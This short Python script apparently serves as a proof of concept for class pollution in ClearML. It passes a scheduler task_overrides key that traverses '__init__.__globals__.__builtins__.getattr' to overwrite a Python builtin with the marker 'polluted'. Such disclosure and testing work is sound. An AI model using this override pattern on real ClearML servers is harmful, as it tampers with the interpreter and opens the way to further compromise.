from clearml import Task
from clearml.automation import TaskScheduler

task = Task.init(project_name="tmp", task_name="tmp") 
scheduler = TaskScheduler()
scheduler.add_task(
    name='recurring pipeline job',
    schedule_task_id=Task.get_task(project_name='tmp', task_name='tmp'),
    queue='default',
    execute_immediately=True,
    minute=1,
    recurring=False,
    task_overrides={
      '__init__.__globals__.__builtins__.getattr': 'polluted'
    }
)

scheduler.start()